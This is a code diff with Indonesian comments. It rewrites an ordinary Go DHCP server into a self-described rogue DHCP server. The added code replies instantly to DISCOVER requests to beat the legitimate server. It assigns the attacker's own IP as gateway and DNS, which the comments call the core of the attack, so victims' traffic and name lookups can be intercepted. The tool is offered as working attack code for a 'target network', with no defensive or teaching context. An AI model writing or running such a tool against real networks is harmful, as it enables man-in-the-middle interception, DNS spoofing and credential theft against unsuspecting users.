@@ -1,314 +1,177 @@
 package main
 
 import (
-	"bytes"
-	"fmt"
 	"log"
 	"net"
-	"sync"
+	"os"
+	"os/signal"
+	"syscall"
 	"time"
 
-	"github.com/insomniacslk/dhcp/dhcpv4"
-	"github.com/insomniacslk/dhcp/dhcpv4/server4"
+	"github.com/krolaw/dhcp4"
 )
 
-// Struktur data untuk menyimpan status lease
-type Lease struct {
-	IP         net.IP
-	MAC        net.HardwareAddr
-	ExpiryTime time.Time
-	Hostname   string
+// Konfigurasi untuk Server DHCP Nakal kita
+type RogueConfig struct {
+	// IP dari server nakal ini (harus IP dari mesin tempat kode dijalankan)
+	ServerIP net.IP
+	// Range IP yang akan diberikan ke klien
+	StartIP net.IP
+	EndIP   net.IP
+	// Opsi yang akan diberikan ke klien (ini bagian "jahat"-nya)
+	Options dhcp4.Options
+	// Durasi sewa IP
+	LeaseDuration time.Duration
 }
 
-// Server DHCP kita
-type DHCPServer struct {
-	serverIP      net.IP            // IP dari server DHCP ini
-	subnetMask    net.IPMask        // Subnet mask
-	routerIP      net.IP            // IP Gateway
-	dnsServerIPs  []net.IP          // DNS Server
-	ipPool        []net.IP          // Pool IP yang tersedia
-	leaseDuration time.Duration     // Durasi lease
-	leases        map[string]*Lease // Map untuk menyimpan lease yang aktif, key adalah MAC address string
-	mu            sync.Mutex        // Mutex untuk keamanan akses konkuren
+// RogueDHCPHandler adalah struct yang akan mengimplementasikan interface dhcp4.Handler
+type RogueDHCPHandler struct {
+	config *RogueConfig
+	// Peta untuk melacak IP yang sudah disewakan (sangat sederhana)
+	leaseDB map[string]net.IP
 }
 
-// Fungsi helper untuk melakukan increment pada IP address
-func nextIP(ip net.IP) net.IP {
-	next := make(net.IP, len(ip))
-	copy(next, ip)
-	for j := len(next) - 1; j >= 0; j-- {
-		next[j]++
-		if next[j] > 0 {
-			break
+// ServeDHCP adalah metode yang wajib ada untuk mengimplementasikan dhcp4.Handler
+// PERBAIKAN: Signature metode ini hanya mengembalikan dhcp4.Packet, tanpa bool.
+func (h *RogueDHCPHandler) ServeDHCP(req dhcp4.Packet, msgType dhcp4.MessageType, options dhcp4.Options) dhcp4.Packet {
+	clientMAC := req.CHAddr().String()
+
+	// Konversi map `dhcp4.Options` menjadi slice `[]dhcp4.Option`
+	// karena `dhcp4.ReplyPacket` membutuhkan slice, bukan map.
+	opts := make([]dhcp4.Option, 0, len(h.config.Options))
+	for code, value := range h.config.Options {
+		opts = append(opts, dhcp4.Option{Code: code, Value: value})
+	}
+
+	switch msgType {
+	case dhcp4.Discover:
+		log.Printf("[DISCOVER] Dari MAC: %s", clientMAC)
+
+		// --- LOGIKA UNTUK MEMENANGKAN "PERLOMBAAN" ---
+		// Respon secepat mungkin tanpa delay.
+		// Pilih IP untuk ditawarkan ke klien.
+		offeredIP := dhcp4.IPAdd(h.config.StartIP, dhcp4.IPRange(h.config.StartIP, h.config.EndIP)/2)
+		h.leaseDB[clientMAC] = offeredIP
+		log.Printf("  -> Menawarkan IP: %s", offeredIP)
+
+		// Kembalikan paket DHCPOFFER
+		reply := dhcp4.ReplyPacket(
+			req,                    // Paket permintaan asli
+			dhcp4.Offer,            // Tipe pesan: Offer
+			h.config.ServerIP,      // IP Server (Server Identifier)
+			offeredIP,              // IP yang ditawarkan
+			h.config.LeaseDuration, // Durasi sewa
+			opts,                   // Gunakan slice yang sudah dikonversi
+		)
+		// PERBAIKAN: Hanya mengembalikan paket reply
+		return reply
+
+	case dhcp4.Request:
+		log.Printf("[REQUEST] Dari MAC: %s", clientMAC)
+
+		// Cek apakah kita yang diminta oleh klien (berdasarkan Server Identifier)
+		if serverIdent, ok := options[dhcp4.OptionServerIdentifier]; ok && !net.IP(serverIdent).Equal(h.config.ServerIP) {
+			// Ini permintaan untuk server lain, abaikan.
+			log.Printf("  -> Request untuk server lain (%s), diabaikan.", net.IP(serverIdent))
+			// PERBAIKAN: Kembalikan nil untuk tidak membalas
+			return nil
 		}
-	}
-	return next
-}
 
-// Fungsi untuk membuat server DHCP baru
-func NewDHCPServer(ifaceName, serverIPStr, subnetMaskStr, routerIPStr string, ipPoolStartStr, ipPoolEndStr string) (*DHCPServer, error) {
-	serverIP := net.ParseIP(serverIPStr)
-	if serverIP == nil {
-		return nil, fmt.Errorf("invalid server IP address: %s", serverIPStr)
-	}
-
-	_, subnetMask, err := net.ParseCIDR(subnetMaskStr)
-	if err != nil {
-		return nil, fmt.Errorf("invalid subnet mask: %s", subnetMaskStr)
-	}
-
-	routerIP := net.ParseIP(routerIPStr)
-	if routerIP == nil {
-		return nil, fmt.Errorf("invalid router IP address: %s", routerIPStr)
-	}
-
-	// Buat pool IP
-	startIP := net.ParseIP(ipPoolStartStr)
-	endIP := net.ParseIP(ipPoolEndStr)
-	if startIP == nil || endIP == nil {
-		return nil, fmt.Errorf("invalid IP pool range")
-	}
-
-	var ipPool []net.IP
-	// Perbaikan: Gunakan bytes.Compare untuk membandingkan IP dan loop hingga endIP
-	for ip := startIP; bytes.Compare(ip.To4(), endIP.To4()) <= 0; ip = nextIP(ip) {
-		// Tambahkan IP ke pool jika bukan IP server
-		if !ip.Equal(serverIP) {
-			// Salin IP untuk menghindasi masalah referensi
-			ipToAdd := make(net.IP, len(ip))
-			copy(ipToAdd, ip)
-			ipPool = append(ipPool, ipToAdd)
+		// Klien meminta IP dari kita, kirim DHCPACK
+		requestedIP := net.IP(options[dhcp4.OptionRequestedIPAddress])
+		if requestedIP == nil {
+			requestedIP = req.CIAddr()
 		}
-	}
 
-	return &DHCPServer{
-		serverIP:      serverIP,
-		subnetMask:    subnetMask.Mask,
-		routerIP:      routerIP,
-		dnsServerIPs:  []net.IP{net.ParseIP("8.8.8.8"), net.ParseIP("8.8.4.4")}, // Contoh DNS Google
-		ipPool:        ipPool,
-		leaseDuration: 24 * time.Hour, // Lease selama 24 jam
-		leases:        make(map[string]*Lease),
-	}, nil
-}
+		// Gunakan IP yang kita tawarkan sebelumnya
+		ackIP, ok := h.leaseDB[clientMAC]
+		if !ok {
+			ackIP = requestedIP // fallback
+		}
 
-// Handler utama untuk setiap paket DHCP yang diterima.
-// Tanda tangan ini sudah sesuai dengan yang diharapkan oleh server4.Handler.
-func (s *DHCPServer) handleDHCPRequest(conn net.PacketConn, peer net.Addr, pkt *dhcpv4.DHCPv4) {
-	s.mu.Lock()
-	defer s.mu.Unlock()
+		log.Printf("  -> Mengonfirmasi (ACK) IP: %s", ackIP)
 
-	macStr := pkt.ClientHWAddr.String()
-	log.Printf("Received DHCP message from %s (%s), type: %v", macStr, peer, pkt.MessageType())
+		reply := dhcp4.ReplyPacket(
+			req,
+			dhcp4.ACK,
+			h.config.ServerIP,
+			ackIP,
+			h.config.LeaseDuration,
+			opts, // Gunakan slice yang sudah dikonversi
+		)
+		// PERBAIKAN: Hanya mengembalikan paket reply
+		return reply
 
-	switch pkt.MessageType() {
-	case dhcpv4.MessageTypeDiscover:
-		s.handleDiscover(pkt, macStr, conn, peer)
-	case dhcpv4.MessageTypeRequest:
-		s.handleRequest(pkt, macStr, conn, peer)
-	case dhcpv4.MessageTypeRelease:
-		s.handleRelease(pkt, macStr)
 	default:
-		log.Printf("Ignoring message type: %v", pkt.MessageType())
+		// Abaikan tipe pesan lainnya
+		// PERBAIKAN: Kembalikan nil untuk tidak membalas
+		return nil
 	}
-}
-
-func (s *DHCPServer) handleDiscover(pkt *dhcpv4.DHCPv4, macStr string, conn net.PacketConn, peer net.Addr) {
-	// Cek apakah client sudah memiliki lease
-	if lease, exists := s.leases[macStr]; exists && lease.ExpiryTime.After(time.Now()) {
-		log.Printf("Client %s already has a lease for %s", macStr, lease.IP)
-		s.sendOffer(pkt, lease.IP, conn, peer)
-		return
-	}
-
-	// Cari IP yang tersedia dari pool
-	ip := s.findAvailableIP()
-	if ip == nil {
-		log.Printf("No available IP in the pool for %s", macStr)
-		return
-	}
-
-	log.Printf("Offering IP %s to %s", ip, macStr)
-	s.sendOffer(pkt, ip, conn, peer)
-}
-
-func (s *DHCPServer) handleRequest(pkt *dhcpv4.DHCPv4, macStr string, conn net.PacketConn, peer net.Addr) {
-	requestedIP := pkt.RequestedIPAddress()
-
-	// Verifikasi IP yang diminta valid dan tersedia
-	if !s.isIPInPool(requestedIP) {
-		log.Printf("Client %s requested invalid IP %s", macStr, requestedIP)
-		s.sendNak(pkt, conn, peer)
-		return
-	}
-
-	// Jika client sudah memiliki lease, perbarui
-	if lease, exists := s.leases[macStr]; exists && lease.IP.Equal(requestedIP) {
-		lease.ExpiryTime = time.Now().Add(s.leaseDuration)
-		log.Printf("ACK: Renewed lease for %s -> %s", macStr, requestedIP)
-		s.sendAck(pkt, requestedIP, conn, peer)
-		return
-	}
-
-	// Jika IP tersedia, berikan lease baru
-	if s.isIPAvailable(requestedIP) {
-		s.leases[macStr] = &Lease{
-			IP:         requestedIP,
-			MAC:        pkt.ClientHWAddr,
-			ExpiryTime: time.Now().Add(s.leaseDuration),
-			Hostname:   pkt.HostName(),
-		}
-		log.Printf("ACK: Assigned new lease for %s -> %s", macStr, requestedIP)
-		s.sendAck(pkt, requestedIP, conn, peer)
-		return
-	}
-
-	log.Printf("NAK: IP %s is not available for %s", requestedIP, macStr)
-	s.sendNak(pkt, conn, peer)
-}
-
-func (s *DHCPServer) handleRelease(pkt *dhcpv4.DHCPv4, macStr string) {
-	lease, exists := s.leases[macStr]
-	if !exists {
-		log.Printf("Received release for unknown MAC %s", macStr)
-		return
-	}
-
-	// Dapatkan IP yang dilepas oleh client dari paket DHCPRELEASE
-	releasedIP := pkt.ClientIPAddr
-
-	// Periksa apakah IP yang dilepas cocok dengan yang ada di catatan lease kita
-	if !lease.IP.Equal(releasedIP) {
-		log.Printf("Warning: Client %s released IP %s, but our lease record has %s", macStr, releasedIP, lease.IP)
-		// Dalam kasus sederhana, kita tetap percaya pada MAC dan hapus lease-nya.
-		// Di lingkungan produksi, mungkin perlu penanganan lebih lanjut.
-	}
-
-	log.Printf("Released lease for %s -> %s", macStr, lease.IP)
-	delete(s.leases, macStr)
-}
-
-func (s *DHCPServer) sendOffer(pkt *dhcpv4.DHCPv4, ip net.IP, conn net.PacketConn, peer net.Addr) {
-	offer, err := dhcpv4.NewReplyFromRequest(pkt,
-		dhcpv4.WithMessageType(dhcpv4.MessageTypeOffer),
-		dhcpv4.WithYourIP(ip),
-		dhcpv4.WithServerIP(s.serverIP),
-		dhcpv4.WithOption(dhcpv4.OptSubnetMask(s.subnetMask)),
-		dhcpv4.WithOption(dhcpv4.OptRouter(s.routerIP)),
-		dhcpv4.WithOption(dhcpv4.OptDNS(s.dnsServerIPs...)),
-		dhcpv4.WithOption(dhcpv4.OptIPAddressLeaseTime(s.leaseDuration)),
-	)
-	if err != nil {
-		log.Printf("Failed to build DHCPOFFER: %v", err)
-		return
-	}
-
-	if _, err := conn.WriteTo(offer.ToBytes(), peer); err != nil {
-		log.Printf("Failed to send DHCPOFFER: %v", err)
-	}
-}
-
-func (s *DHCPServer) sendAck(pkt *dhcpv4.DHCPv4, ip net.IP, conn net.PacketConn, peer net.Addr) {
-	ack, err := dhcpv4.NewReplyFromRequest(pkt,
-		dhcpv4.WithMessageType(dhcpv4.MessageTypeAck),
-		dhcpv4.WithYourIP(ip),
-		dhcpv4.WithServerIP(s.serverIP),
-		dhcpv4.WithOption(dhcpv4.OptSubnetMask(s.subnetMask)),
-		dhcpv4.WithOption(dhcpv4.OptRouter(s.routerIP)),
-		dhcpv4.WithOption(dhcpv4.OptDNS(s.dnsServerIPs...)),
-		dhcpv4.WithOption(dhcpv4.OptIPAddressLeaseTime(s.leaseDuration)),
-	)
-	if err != nil {
-		log.Printf("Failed to build DHCPACK: %v", err)
-		return
-	}
-
-	if _, err := conn.WriteTo(ack.ToBytes(), peer); err != nil {
-		log.Printf("Failed to send DHCPACK: %v", err)
-	}
-}
-
-func (s *DHCPServer) sendNak(pkt *dhcpv4.DHCPv4, conn net.PacketConn, peer net.Addr) {
-	nak, err := dhcpv4.NewReplyFromRequest(pkt,
-		dhcpv4.WithMessageType(dhcpv4.MessageTypeNak),
-		dhcpv4.WithServerIP(s.serverIP),
-		dhcpv4.WithOption(dhcpv4.OptMessage("Requested IP not available.")),
-	)
-	if err != nil {
-		log.Printf("Failed to build DHCPNAK: %v", err)
-		return
-	}
-
-	if _, err := conn.WriteTo(nak.ToBytes(), peer); err != nil {
-		log.Printf("Failed to send DHCPNAK: %v", err)
-	}
-}
-
-// Helper untuk mencari IP yang tersedia
-func (s *DHCPServer) findAvailableIP() net.IP {
-	for _, ip := range s.ipPool {
-		if s.isIPAvailable(ip) {
-			return ip
-		}
-	}
-	return nil
-}
-
-func (s *DHCPServer) isIPAvailable(ip net.IP) bool {
-	// Cek apakah IP sedang digunakan dalam lease aktif
-	for _, lease := range s.leases {
-		if lease.IP.Equal(ip) && lease.ExpiryTime.After(time.Now()) {
-			return false
-		}
-	}
-	return true
-}
-
-func (s *DHCPServer) isIPInPool(ip net.IP) bool {
-	for _, poolIP := range s.ipPool {
-		if poolIP.Equal(ip) {
-			return true
-		}
-	}
-	return false
 }
 
 func main() {
-	// --- KONFIGURASI SERVER ---
-	// Ganti nilai-nilai ini sesuai dengan jaringan Anda
-	ifaceName := "eth0"            // Nama antarmuka jaringan
-	serverIP := "192.168.1.10"     // IP statis dari server DHCP ini
-	subnetMask := "255.255.255.0"  // Subnet mask
-	routerIP := "192.168.1.1"      // IP Gateway
-	ipPoolStart := "192.168.1.100" // Awal pool IP
-	ipPoolEnd := "192.168.1.200"   // Akhir pool IP
-	// -------------------------
+	// --- KONFIGURASI ---
+	// Ganti ini dengan IP dari interface jaringan yang terhubung ke jaringan target.
+	serverIPStr := "172.16.1.100" // <--- UBAH INI
 
-	dhcpServer, err := NewDHCPServer(ifaceName, serverIP, subnetMask, routerIP, ipPoolStart, ipPoolEnd)
+	serverIP := net.ParseIP(serverIPStr)
+	if serverIP == nil {
+		log.Fatalf("IP Server tidak valid: %s", serverIPStr)
+	}
+
+	// Konfigurasi jahat kita
+	config := &RogueConfig{
+		ServerIP:      serverIP,
+		StartIP:       net.ParseIP("172.16.1.150"),
+		EndIP:         net.ParseIP("172.16.1.200"),
+		LeaseDuration: 24 * time.Hour, // 24 jam
+		Options: dhcp4.Options{
+			// --- INI ADALAH INTI SERANGAN ---
+			// 1. Router (Gateway) diatur ke IP kita.
+			dhcp4.OptionRouter: []byte(serverIP),
+			// 2. DNS Server diatur ke IP kita.
+			dhcp4.OptionDomainNameServer: []byte(serverIP),
+			// 3. Subnet Mask
+			dhcp4.OptionSubnetMask: []byte{255, 255, 255, 0},
+		},
+	}
+
+	// --- SETUP JARINGAN ---
+	// DHCP bekerja di port 67 (server) dan 68 (client). Kita perlu listen di port 67.
+	conn, err := net.ListenPacket("udp4", ":67")
 	if err != nil {
-		log.Fatalf("Failed to create DHCP server: %v", err)
+		log.Fatalf("Gagal membuat listener di port 67. Apakah Anda menjalankan sebagai root/administrator? Error: %v", err)
+	}
+	defer conn.Close()
+
+	log.Printf("🚨 Server DHCP Nakal Berjalan! 🚨")
+	log.Printf("IP Server Nakal: %s", config.ServerIP)
+	log.Printf("Range IP yang ditawarkan: %s - %s", config.StartIP, config.EndIP)
+	log.Printf("Gateway Jahat: %s", config.Options[dhcp4.OptionRouter])
+	log.Printf("DNS Jahat: %s", config.Options[dhcp4.OptionDomainNameServer])
+	log.Println("Tekan Ctrl+C untuk menghentikan.")
+
+	// Buat instance dari handler kita
+	handler := &RogueDHCPHandler{
+		config:  config,
+		leaseDB: make(map[string]net.IP),
 	}
 
-	log.Printf("Starting DHCP server on interface %s", ifaceName)
-	log.Printf("Server IP: %s", serverIP)
-	log.Printf("IP Pool: %s - %s", ipPoolStart, ipPoolEnd)
+	// Setup untuk graceful shutdown
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 
-	// Buat listener pada antarmuka jaringan
-	laddr := &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 67}
+	// Jalankan server DHCP di goroutine terpisah menggunakan fungsi bantuan `dhcp4.Serve`
+	go func() {
+		if err := dhcp4.Serve(conn, handler); err != nil {
+			log.Printf("Server DHCP berhenti: %v", err)
+		}
+	}()
 
-	// PERBAIKAN AKHIR: Buat handler yang cocok dengan tipe server4.Handler
-	// dengan membungkus pemanggilan method kita ke dalam fungsi anonim.
-	handler := func(conn net.PacketConn, peer net.Addr, pkt *dhcpv4.DHCPv4) {
-		dhcpServer.handleDHCPRequest(conn, peer, pkt)
-	}
-
-	server, err := server4.NewServer(ifaceName, laddr, handler)
-	if err != nil {
-		log.Fatalf("Failed to start DHCP server listener: %v", err)
-	}
-
-	// Jalankan server
-	if err := server.Serve(); err != nil {
-		log.Fatalf("Server error: %v", err)
-	}
+	// Tunggu sinyal shutdown (Ctrl+C)
+	<-c
+	log.Println("\nMenghentikan server...")
+	// Menutup koneksi akan menyebabkan dhcp4.Serve berhenti.
+	conn.Close()
+	log.Println("Server dihentikan.")
 }
